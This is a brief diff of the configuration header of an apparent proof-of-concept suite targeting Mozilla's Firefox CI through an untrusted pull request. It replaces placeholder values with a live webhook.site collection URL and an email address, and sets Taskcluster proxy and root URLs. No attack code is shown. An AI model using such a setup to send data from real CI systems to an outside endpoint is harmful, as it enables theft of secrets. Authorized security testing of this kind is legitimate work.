@@ -2,8 +2,8 @@
 # FirefoxCI PoC Suite - mozilla-vpn-client untrusted PR
 # Khong dung set -e de script chay het du 1 poc fail
 
-WEBHOOK_URL="https://webhook.site/YOUR-UNIQUE-ID"
-MY_EMAIL="your.email+firefoxci@gmail.com"
+WEBHOOK_URL="https://webhook.site/2e7af29f-f5f5-4650-a012-99d14df3f88a"
+MY_EMAIL="brian.baker@xketamine.me"
 PROXY_URL="${TASKCLUSTER_PROXY_URL:-http://taskcluster}"
 ROOT_URL="https://firefox-ci-tc.services.mozilla.com"
 
